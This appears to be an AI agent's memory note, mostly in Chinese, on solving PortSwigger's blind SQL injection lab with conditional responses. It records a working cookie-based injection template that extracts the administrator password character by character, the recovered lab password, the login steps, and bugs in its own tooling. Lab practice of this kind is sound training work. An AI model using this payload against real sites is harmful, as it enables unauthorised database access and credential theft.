---
metadata:
  node_type: memory
name: "PRS arm A lab-conditional-responses"
description: "arm A 基线:lab-conditional-responses 一次通过 - TrackingId cookie 盲注(substring 逐字符 20 位),administrator 登录后 banner is-solved;并记 blind_oracle 并发假阴性 + submitform 缺 base 两坑"
last_updated: 2026-10-09T05:42:28+08:00
created: 2026-10-09T05:42:28+08:00
---

## 2026-10-09 冷实例一次通过

- 题:portswigger/web-security/sql-injection/blind/lab-conditional-responses;`range_launch launch-url https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses --jar /tmp/cj1.json` 直接起实例(reused:false,无需 page_read 取号)。
- 盲注面:TrackingId cookie;真值标记 = 页面里的 `Welcome back!`(用 `Welcome back` 子串即可)。
- 关键坑:payload 必须以**库里已存在的 tracker id** 为前缀,否则查询无行、永不出标记。该值在 jar 里(本例 `TRJP0p3C2Fgn1qG3`),不要凭空写 `xyz`。
- 提取:`blind_oracle <root> --template "TRJP0p3C2Fgn1qG3' AND (SELECT SUBSTRING(password,{I},1) FROM users WHERE username='administrator')='{C}'--" --true "Welcome back" --place cookie:TrackingId --charset abc..z0..9 --max 20`。
  - 20 位:`jiqsl3vksnfi881a1iol`;固定下标形态(模板写死 `SUBSTRING(password,1,1)`,不给 {I})同样可用,便于单点复验。
- 收口:`GET /login` 取 csrf → `POST /login`(csrf+username=administrator+口令)→ 302 `/my-account?id=administrator` → `banner_verdict --jar` 报 solved=true、congrats_line 命中。

### 件面发现(本轮)

- `blind_oracle --classify` 分支编译失败(E0594:`let probe_cfg` 缺 `mut`),已在 `packages/rs-agent/src/extensions/rust_script/scripts/hunter-suite/blind_oracle.rs` 修;非 --classify 路径不受影响。
- `blind_oracle --threads 8` 会出**假阴性**:同一 charset(含正确字符)下两次 8 线程跑分别在 pos 16 / pos 12 提前 terminated,单线程 `--threads 1` 一次跑满 20 位(334s)。盲注抽取默认单线程。
- `http_session submitform`:传 URL 报 `no form in file`(该子命令把参数当文件),传 html 文件又报 `bad url /login: relative URL without a base`(无 base 旗标)。可用路径 = `get <url>/login --out` 读 csrf + 手工 `post --form`。

